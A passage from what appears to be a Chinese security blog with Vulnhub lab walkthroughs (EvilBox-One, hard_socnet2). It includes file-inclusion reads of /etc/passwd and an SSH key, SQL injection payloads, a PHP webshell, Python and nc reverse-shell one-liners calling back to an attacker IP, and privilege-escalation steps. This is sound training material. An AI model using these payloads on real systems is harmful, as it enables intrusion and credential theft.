src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422055352036.png" alt="image-20220422055352036" style="zoom: 80%;"><p>访问robots.txt,H4xOr可能是用户名</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422054914259.png" alt="image-20220422054914259"></p><p>访问&#x2F;secret目录为空白，不存在目录遍历</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422055219688.png" alt="image-20220422055219688"></p><p>二级目录扫描，发现evil.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.31.65/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html,bak</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422055648290.png" alt="image-20220422055648290"></p><p>访问这两个文件，都是空白</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422060007208.png" alt="image-20220422060007208"></p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422060048726.png" alt="image-20220422060048726"></p><p>猜测evil.php可能存在命令执行或文件包含等参数，对evil.php尝试参数爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.31.65/secret/evil.php?FUZZ=./index.html -fs=0</span><br><span class="line"></span><br><span class="line">FUZZ为爆破点</span><br><span class="line">./index.html为evil.php同目录下的文件</span><br><span class="line">-fs=0过滤掉页面位空的数据</span><br></pre></td></tr></table></figure><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422061217266.png" alt="image-20220422061217266" style="zoom: 80%;"><p>命令执行失败</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422061333361.png" alt="image-20220422061333361"></p><p>文件包含成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.65/secret/evil.php?command=../index.html</span><br></pre></td></tr></table></figure><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422061404851.png" alt="image-20220422061404851" style="zoom: 50%;"><p>通过伪协议读取evil.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.65/secret/evil.php?command=php://filter/read=convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422062214426.png" alt="image-20220422062214426"></p><p>base64解密</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422062428434.png" alt="image-20220422062428434"></p><p>尝试远程文件包含</p><p>本地创建一句话木马并开启web服务</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422062906747.png" alt="image-20220422062906747"></p><p>空白——测试php一句话——远程文件包含失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.65/secret/evil.php?command=http://192.168.31.125/mz.txt</span><br></pre></td></tr></table></figure><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422063215834.png" alt="image-20220422063215834" style="zoom: 80%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试php://input（不可用）</span><br><span class="line">http://192.168.31.65/secret/evil.php?command=php://input</span><br><span class="line">post提交：&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422232955348.png" alt="image-20220422232955348" style="zoom:80%;"><p>利用文件包含读取文件，存在两个可登录账户root和mowree</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">http://192.168.31.65/secret/evil.php?command=../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422064343154.png" alt="image-20220422064343154"></p><p>ssh登录有两种方式，密码登录和密钥登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看mowree家目录下的私钥文件，默认路径 /home/mowree/.ssh/id_rsa</span><br><span class="line">http://192.168.31.65/secret/evil.php?command=../../../../../home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422064935582.png" alt="image-20220422064935582"></p><p>右键查看源代码获取标准格式密钥</p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422065047297.png" alt="image-20220422065047297" style="zoom: 67%;"><p>将密钥复制保存到本地，命名为id_rsa,修改权限为600</p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422065457185.png" alt="image-20220422065457185" style="zoom:80%;"><p>利用私钥登录目标，需要私钥口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa mowree@192.168.31.65</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422065647042.png" alt="image-20220422065647042"></p><p>使用john爆破密钥密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh2john.py将密钥转化为john能识别格式   python ssh2john.py id_rsa &gt; ./hash</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422070200048.png" alt="image-20220422070200048"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用字典rockyou.txt爆破    john hash --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422070630466.png" alt="image-20220422070630466"></p><p>再次使用密钥登录</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422070817066.png" alt="image-20220422070817066"></p><p>获取第一个flag</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422070836631.png" alt="image-20220422070836631"></p><p>第二个flag应该root家目录下，没权限</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422071014000.png" alt="image-20220422071014000"></p><p>suid提权，无利用点</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422071220158.png" alt="image-20220422071220158"></p><p>sudo规则看不了</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422071259807.png" alt="image-20220422071259807"></p><p>内核提权，无可利用exp</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422071344924.png" alt="image-20220422071344924"></p><p>查看web目录无有用文件</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422071855946.png" alt="image-20220422071855946"></p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422071836967.png" alt="image-20220422071836967"></p><p>查看可写入文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null|grep -v proc</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422223352554.png" alt="image-20220422223352554"></p><p>将root密码占位符X处修改为通过openssl加密后的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl加密123</span><br><span class="line">openssl passwd -1</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422223618599.png" alt="image-20220422223618599"></p><p>将加密后的字符替换root的X密码占位符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">o换行输入</span><br><span class="line">dd删除光标所在行</span><br></pre></td></tr></table></figure><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422224135607.png" alt="image-20220422224135607" style="zoom: 80%;"><p>切换为root用户</p><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422224229118.png" alt="image-20220422224229118"></p><p>总结</p><p>端口扫描开放22和80 —— 目录扫描获得robots.txt文件、secret目录 —— 扫描二级目录发现evil.php文件 —— ffuf爆破参数command ——    文件包含读取&#x2F;etc&#x2F;passwd获得可登录账号，读取&#x2F;home&#x2F;mowree&#x2F;.ssh&#x2F;id_rsa获得私钥 —— 利用私钥登录，john爆破私钥口令 —— 查找可写入文件&#x2F;etc&#x2F;passwd —— openssl加密替换root的X密码占位符 —— 切换用户，获得root权限</p><hr><p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机之hard_socnet2</title>
      <link href="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/"/>
      <url>/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/</url>
      
        <content type="html"><![CDATA[<p>主机发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.31.0/24</span><br></pre></td></tr></table></figure><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170014489.png" alt="image-20220417170014489" style="zoom:80%;"><p>端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.31.101</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170119799.png" alt="image-20220417170119799"></p><p>服务扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 22,80,8000 192.168.31.101</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170352319.png" alt="image-20220417170352319"></p><p>访问web80</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170541161.png" alt="image-20220417170541161" style="zoom: 50%;"><p>登录框，Ubuntu+Apache+PHP+Python+<em><strong>MySQL</strong></em></p><p>访问web8000</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417171335932.png" alt="image-20220417171335932" style="zoom: 67%;"><p>不支持GET请求，换其它请求类型？</p><p>先从80登录框入手</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆破？但不知email放弃</span><br><span class="line">注入？bp抓包post型报错注入</span><br><span class="line">万能密码，or 1=1对email格式进行检查</span><br><span class="line">可以注册，先注册个账号，看后台功能       后台任意文件getshell</span><br></pre></td></tr></table></figure><p>注入？bp抓包</p><p>存在爆破注入</p><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417174210561.png" alt="image-20220417174210561"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useremail=test%40qq.com&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1)--+&amp;userpass=123&amp;login=Login</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417174333411.png" alt="image-20220417174333411"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据库名socialnetwork</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表名 friendship、posts、user_phone、users</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;socialnetwork&#x27; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">users字段名user_id、user_firstname、user_firstname、user_lastname、user_nickname、user_password、user_email、user_gender、user_birthdate、user_status、user_about、user_hometown</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;socialnetwork&#x27; and table_name=&#x27;users&#x27; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user_email值  admin@localhost.com、testuser@localhost.com</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select user_email from users limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user_password值</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select substr(user_password,1,20) from users limit 0,1),0x7e),1)--+  21232f297a57a5a74389</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select substr(user_password,21,20) from users limit 0,1),0x7e),1)--+</span><br><span class="line">4a0e4a801fc3</span><br><span class="line">21232f297a57a5a743894a0e4a801fc3admin</span><br></pre></td></tr></table></figure><p>md5解密</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417181840390.png" alt="image-20220417181840390" style="zoom:67%;"><p>同样的方法获取到Emial及密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@localhost.com21232f297a57a5a743894a0e4a801fc3admin</span><br><span class="line">testuser@localhost.com5d9c68c6c50ed3d02a2fcf54f63993b6testuser</span><br></pre></td></tr></table></figure><p> 利用<a href="mailto:&#97;&#100;&#109;&#x69;&#110;&#64;&#x6c;&#111;&#x63;&#x61;&#x6c;&#x68;&#111;&#x73;&#116;&#x2e;&#99;&#111;&#109;">&#97;&#100;&#109;&#x69;&#110;&#64;&#x6c;&#111;&#x63;&#x61;&#x6c;&#x68;&#111;&#x73;&#116;&#x2e;&#99;&#111;&#109;</a>登录后台</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417201303157.png" alt="image-20220417201303157" style="zoom: 50%;"><p>搜索框处存在报错注入</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417201400421.png" alt="image-20220417201400421" style="zoom:50%;"><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417201837518.png" alt="image-20220417201837518" style="zoom:50%;"><p>任意文件上传</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417202512417.png" alt="image-20220417202512417" style="zoom:50%;"><p>上传一句话木马mz.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mz&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>右键新标签打开图片，发现上传的mz.php重命名为12.php</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204053603.png" alt="image-20220417204053603" style="zoom:67%;"><p>测试命令执行</p><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204120999.png" alt="image-20220417204120999"></p><p>测试一句话phpinfo()</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204209628.png" alt="image-20220417204209628" style="zoom:50%;"><p>蚁剑连接</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204632436.png" alt="image-20220417204632436" style="zoom:67%;"><p>权限为www-data</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204725470.png" alt="image-20220417204725470" style="zoom:67%;"><p>反弹shell，提权</p><p>python和nc都可以反弹</p><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204959441.png" alt="image-20220417204959441"></p><p>python反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.125&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418063632369.png" alt="image-20220418063632369"></p><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205156091.png" alt="image-20220417205156091"></p><p>nc反弹</p><p>同样还是禁用了-e参数，可以用nc串联，这次使用另一种反弹方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.31.125 12346 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205446204.png" alt="image-20220417205446204"></p><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205511249.png" alt="image-20220417205511249"></p><p>当然也可以将&#x2F;bin&#x2F;bash换成&#x2F;bin&#x2F;sh，只要目标机上存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.125 12347 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205807779.png" alt="image-20220417205807779"></p><p>信息搜集</p><p>翻目录发现mysql连接文件获取到账号和密码</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210152355.png" alt="image-20220417210152355" style="zoom:67%;"><p>连接数据库，没发现有用数据</p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210338075.png" alt="image-20220417210338075" style="zoom: 80%;"><p>查看可以远程登录的账号</p><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210517187.png" alt="image-20220417210517187"></p><p>尝试用admin数据库密码ssh远程登录socnet，可惜失败</p><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417211059062.png" alt="image-20220417211059062"></p><p>suid提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417211331131.png" alt="image-20220417211331131"></p><p>查看socnet的&#x2F;home目录</p><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210627124.png" alt="image-20220417210627124"></p><p>常规提权思路</p><p>www-data——&gt;socnet——&gt;root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查内核uname -a</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417211915852.png" alt="image-20220417211915852"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看Ubuntu版本详细信息lsb_release -a</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417212145485.png" alt="image-20220417212145485"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看pkexec版本pkexec --version</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418062534849.png" alt="image-20220418062534849"></p><p>这次不走寻常路，分别利用CVE-2021-3493和CVE-2021-4034完成提权</p><p>利用CVE-2021-3493提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp地址：https://github.com/briskets/CVE-2021-3493</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">漏洞概述：OverlayFS漏洞允许Ubuntu下的本地用户获得root权限。Linux内核中overlayfs文件系统中的Ubuntu特定问题，在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用程序。由于Ubuntu附带了一个允许非特权的overlayfs挂载的补丁，因此本地攻击者可以使用它来获得更高的特权。</span><br><span class="line">受影响版本：</span><br><span class="line">            Ubuntu 20.10</span><br><span class="line">            Ubuntu 20.04 LTS</span><br><span class="line">            Ubuntu 19.04</span><br><span class="line">            Ubuntu 18.04 LTS</span><br><span class="line">            Ubuntu 16.04 LTS</span><br><span class="line">            Ubuntu 14.04 ESM</span><br><span class="line">修复建议：更新系统软件包版本。</span><br><span class="line">         在Linux 5.11中，对的调用 cap_convert_nscap 已移入 vfs_setxattr，更新Linux内核至5.11则不会再被利用。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https://www.secpulse.com/archives/158063.html</span><br><span class="line">https://www.freebuf.com/vuls/280445.html</span><br></pre></td></tr></table></figure><p>将exp上传到目标机，赋予执行权限，编译，执行（也可以本地gcc编译exp再上传，赋权，执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">赋予执行权限chmod u+x exploit.c</span><br><span class="line">编译gcc exploit.c -o exp</span><br><span class="line">执行./exp</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417212944873.png" alt="image-20220417212944873"></p><p>利用CVE-2021-4034提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exp地址：https://github.com/berdav/CVE-2021-4034</span><br><span class="line">https://github.com/nikaiw/CVE-2021-4034</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">漏洞概述：polkit是一个授权管理器，其系统架构由授权和身份验证代理组成，pkexec是其中polkit的其中一个工具，他的作用有点类似于sudo，允许用户以另一个用户身份执行命令</span><br><span class="line">polkit 提供了一个授权 API，供特权程序（“ MECHANISMS ” ）使用，通常通过某种形式的进程间通信机制为非特权程序（ “ SUBJECTS ”）提供服务。在这种情况下，该机制通常将主体视为不受信任。对于来自主体的每个请求，该机制需要确定该请求是否被授权，或者它是否应该拒绝为主体提供服务。使用 polkit API，一种机制可以将此决定转交给受信任的一方：polkit 权威。</span><br><span class="line">polkit 权限被实现为系统守护进程 polkitd (8)，它本身没有什么特权，因为它以 polkitd系统用户身份运行。机制、主体和认证代理使用系统消息总线与授权机构进行通信。</span><br><span class="line">除了作为授权之外，polkit 还允许用户通过验证管理用户或客户端所属会话的所有者来获得临时授权。这对于机制需要验证系统的操作员确实是用户还是管理用户的场景很有用</span><br><span class="line">plokit基本组成</span><br><span class="line">polkit— 授权管理器</span><br><span class="line">polkitd— polkit 系统守护进程</span><br><span class="line">pkcheck— 检查一个进程是否被授权</span><br><span class="line">pkaction— 获取有关已注册操作的详细信息</span><br><span class="line">pkexec— 以另一个用户身份执行命令</span><br><span class="line">pkttyagent— 文本认证助手</span><br><span class="line">受影响版本：Polkit预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，2009年5月至今发布的所有 Polkit 版本</span><br><span class="line">不受影响版本：</span><br><span class="line">CentOS：polkit-0.115</span><br><span class="line">Ubuntu：policykit-1-0.105</span><br><span class="line">修复建议：</span><br><span 